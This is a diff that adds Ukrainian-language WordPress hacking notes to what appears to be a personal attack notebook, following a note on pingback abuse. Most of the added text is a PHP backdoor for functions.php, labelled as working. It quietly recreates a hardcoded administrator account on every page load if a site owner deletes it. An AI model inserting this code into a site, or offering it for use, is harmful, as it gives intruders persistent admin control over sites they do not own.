@@ -108,3 +108,29 @@ http://[domain]; verifying pingback from XX.XXX.XX.XX" "target-
 site"
 
 Таким чином можна маніпуляти цим.
+
+
+@@@@@@@@@@@@@@@@@@@@@@
+WP HACKING
+@@@@@@@@@@@@@@@@@@@@@@
+
+https://wpdirectory.net - база даних регулярних виразів WordPress.
+
+/* WordPress Backdoor - Automating Create New Admin */ (робочий!!)
+
+add in functions.php:
+
+function wpb_admin_account(){
+   $user = 'codepapa';
+   $pass = 'vvVV44$$vvVV44$$';
+   $email = 'codepapa@example.com';
+   if ( !username_exists( $user )  && !email_exists( $email ) ) {
+      $user_id = wp_create_user( $user, $pass, $email );
+      $user = new WP_User( $user_id );
+      $user->set_role( 'administrator' );
+   } 
+}
+add_action('init','wpb_admin_account');
+
+Наведений вище фрагмент коду використовується для повторного створення облікового запису, якщо його було видалено, джерело:
+https://meltechgrp.com/how-hackers-create-hidden-admin-users-on-your-wordpress-blog/
